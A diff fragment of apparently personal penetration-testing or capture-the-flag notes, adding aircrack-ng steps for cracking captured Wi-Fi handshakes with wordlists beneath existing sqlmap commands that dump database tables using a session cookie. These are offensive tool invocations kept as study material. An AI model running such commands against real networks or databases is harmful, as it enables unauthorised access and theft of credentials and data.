@@ -45,3 +45,10 @@ sqlmap -u <"url"> --cookie=<"cookie"> -D <database name> --tables
 sqlmap -u <"url"> --cookie=<"cookie"> -D <database name> -T <table name> --dump
 
 hashes.com
+
+aircrack-ng wap1crack.cap
+aircrack-ng wap2crack.cap -w password.txt
+Aircrack-ng Crack the wireless encryption and identify the Wi-Fi password 
+1st tentative:aircrack-ng pcapfile (usually works only for WEP encryption) 
+2nd tentative: aircrack-ng -w passwordlist pcapfile 
+3rd tentative: adding BSSID (-b flag): aircrack-ng -b BSSID -w passwordlist pcapfile (To find BSSID: on Wireshark click on packet, search BSSID and copy value) 
